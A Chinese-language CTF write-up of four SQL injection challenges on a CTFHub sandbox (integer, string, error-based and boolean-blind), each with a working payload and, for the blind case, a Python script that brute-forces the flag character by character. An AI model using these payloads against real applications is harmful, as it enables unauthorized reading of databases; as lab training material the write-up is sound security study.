# 整數型注入

瞎猜 `id=0` 沒有資料
然後利用 `UNION` 將我們要的資料接出來
測得該表有兩個欄位要填充
然後利用到 `information_schema` 取出表名、欄位名
最後拿到flag

- payload: `?id=0 UNION SELECT group_concat(flag),2 FROM flag`



# 字符型注入

同整數型解法
只是 `id` 變成字串了 記得把語法關好

- payload: `?id=0' UNION SELECT group_concat(flag),2 FROM flag --`



# 報錯注入

關於 `floor(rand(0)*2)` 跟 `count()` 還有 `GROUP BY` 搞在一起會使得錯誤訊息可以被任意回顯我們要的資料
詳細可以參考[這裡](https://www.cnblogs.com/xdans/p/5412468.html)
要注意的是 `group_key` 的長度只有 64 超過就沒有效了
因此要回彈大量資料的話可以能要分次

payload: `?id=0 UNION SELECT count(*),concat((SELECT flag from flag), ':', floor(rand(0)*2)) n FROM information_schema.tables group by n`




# 布爾盲注

語法正確與錯誤只會回彈 `query_success` 與 `query_fail`
因此只能透過 if條件式
構造出條件達成回傳成功
條件失敗回傳錯誤的語法
那麼就可以利用暴力方式去撞出flag

payload:

```python=
import requests

url = 'http://challenge-3d46a4f95eb5dec6.sandbox.ctfhub.com:10080/?id='
flag = ''
i = 1

while True:
	for c in 'abcdefghijklmnopqrstuvwxyz0123456789{}_':
		q = f"if(substr((SELECT flag FROM flag),{i:d},1)='{c:s}', 1, (SELECT table_name FROM information_schema.tables))"
		r = requests.get(url+q)
		if 'query_success' in r.text:
			flag += c
			i += 1
			print(flag)
			if c == '}':
				exit()
			break
```